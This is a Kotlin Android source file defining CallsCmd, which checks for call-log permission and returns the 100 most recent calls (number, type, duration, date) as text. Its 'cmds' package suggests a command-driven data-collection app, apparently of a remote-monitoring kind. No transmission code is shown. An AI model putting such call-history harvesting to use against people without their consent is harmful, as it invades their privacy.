package com.serv.app.cmds

import android.Manifest
import android.content.Context
import android.provider.CallLog
import com.serv.app.core.Perms
import java.text.SimpleDateFormat
import java.util.*

object CallsCmd {
    fun run(ctx: Context): String {
        if (!Perms.has(ctx, Manifest.permission.READ_CALL_LOG)) return "Permissão faltando: READ_CALL_LOG"
        return try {
            val df = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US)
            val sb = StringBuilder()
            ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE),
                null, null, "${CallLog.Calls.DATE} DESC"
            )?.use { c ->
                var n = 0
                while (c.moveToNext() && n < 100) {
                    val num = c.getString(0) ?: "?"
                    val typ = when (c.getInt(1)) {
                        CallLog.Calls.INCOMING_TYPE -> "IN"
                        CallLog.Calls.OUTGOING_TYPE -> "OUT"
                        CallLog.Calls.MISSED_TYPE -> "MISS"
                        else -> "?"
                    }
                    val dur = c.getLong(2)
                    val dt = df.format(Date(c.getLong(3)))
                    sb.append("[$dt] $typ $num ${dur}s\n")
                    n++
                }
            }
            if (sb.isEmpty()) "Sem chamadas." else sb.toString()
        } catch (t: Throwable) { "ERRO: ${t.message}" }
    }
}
